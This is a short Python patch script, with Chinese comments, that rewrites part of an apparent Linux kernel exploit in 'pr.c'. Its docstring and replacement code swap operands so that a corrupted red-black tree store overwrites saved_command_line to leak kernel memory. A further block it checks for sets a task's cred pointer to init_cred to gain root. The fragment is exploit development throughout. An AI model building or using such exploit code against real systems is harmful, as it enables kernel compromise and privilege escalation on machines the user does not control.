# -*- coding: utf-8 -*-
"""把"读通道"那一相改成走**写①** (`*(parent+8) = child`):
   w[0] = &saved_command_line - 8   (= parent)
   w[1] = 想读的地址              (= child, 也是被写进 saved_command_line 的值)
   ⇒ erase 的 `str x9,[x8,#8]` 正好把 w[1] 写进 *(w[0]+8) = saved_command_line ✔
   (相2 已实测这条 store 有效; 没效的那条是 rb_add_color 的 `*(child)=parent`。)
   副作用: rb_add_color 会把 w[0] 写进 `*(想读的地址)` ⇒ 所以读目标必须**可写**,
   而且我们读的其实是我们自己刚铺的带 ⇒ 带内容已知 ✗ —— 所以真正要读的地址得放在
   **带外**(死帧保存寄存器区 / 更深的栈帧), 那里可写 ✔ 且除了我们重铺没人动 ✔"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

old = """    } else if (ph >= 3 && ph <= NSP + 2) {
      C = LK_SAVED_CMDLINE + SLIDE;
      P = (uintptr_t)((long)S + SP_LIST[ph - 3]);"""
new = """    } else if (ph >= 3 && ph <= NSP + 2) {
      /* ★ 交换两个操作数: 让**实测有效的那条 store** (`*(parent+8)=child`) 去改
      *   saved_command_line, 而不是 rb_add_color 那条(相2 证明它对 .bss 不生效)。*/
      P = LK_SAVED_CMDLINE + SLIDE - 8;                  /* parent = 目标-8 */
      C = (uintptr_t)((long)S + SP_LIST[ph - 3]);        /* child  = 想读的地址 */"""
assert old in s
s = s.replace(old, new)

old2 = """    } else if (ph == NSP + 3) {
      if (!TASK) { say("[-] 需要 task=\\n"); return; }
      C = TASK + OFF_T_CRED; P = LK_INIT_CRED + SLIDE;          /* task->cred = init_cred */"""
assert old2 in s

io.open(p, 'w', encoding='utf-8').write(s)
print('ok')
